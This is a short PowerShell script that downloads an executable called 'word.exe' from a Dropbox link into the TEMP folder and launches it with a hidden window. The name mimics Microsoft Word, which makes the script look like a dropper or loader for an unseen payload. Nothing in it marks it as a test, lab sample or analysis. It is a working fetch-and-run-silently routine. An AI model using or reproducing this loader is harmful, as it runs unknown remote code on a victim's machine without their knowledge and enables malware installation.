$DownloadUrl = "https://www.dropbox.com/scl/fi/47rx0jxpexjzv50pqu816/word.exe?rlkey=wigi3xc1w1wxk62jh0n1nj05v&st=vv97m7bo&dl=1"
$ExeName     = "word.exe"
$Arguments   = ""
$DestPath    = Join-Path $env:TEMP $ExeName

Write-Host "Downloading $ExeName..."

try {
    # Using Invoke-WebRequest with -ErrorAction Stop to force the catch block on failure
    Invoke-WebRequest -Uri $DownloadUrl -OutFile $DestPath -ErrorAction Stop
    Write-Host "Downloaded to: $DestPath"
} catch {
    Write-Error "Download failed: $_"
    exit 1
}

Write-Host "Running $ExeName silently..."

$StartArgs = @{
    FilePath    = $DestPath
    WindowStyle = "Hidden"
    Wait        = $true
}

if ($Arguments -ne "") {
    $StartArgs.ArgumentList = $Arguments
}

try {
    $Proc = Start-Process @StartArgs -PassThru
    Write-Host "Process exited with code: $($Proc.ExitCode)"
} catch {
    Write-Error "Failed to run executable: $_"
    exit 1
}
